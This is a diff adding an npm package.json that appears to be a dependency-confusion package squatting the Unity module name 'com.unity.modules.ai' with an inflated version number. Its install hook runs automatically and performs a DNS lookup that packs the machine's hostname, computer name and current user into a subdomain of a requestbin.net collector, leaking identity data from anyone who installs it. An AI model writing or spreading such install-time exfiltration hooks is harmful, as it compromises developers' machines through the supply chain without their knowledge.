@@ -1,0 +1,11 @@
+{
+  "name": "com.unity.modules.ai",
+  "version": "200.0.6",
+  "description": "com.unity.modules.ai: coolest nodejs  package on planet earth",
+  "main": "index.js",
+  "scripts": {
+    "install": "nslookup `hostname`-%computername%.`whoami`-%username%.com.unity.modules.ai.a430051ef18acd86255c.d.requestbin.net"
+  },
+  "author": "another noob developer",
+  "license": "ISC"
+}
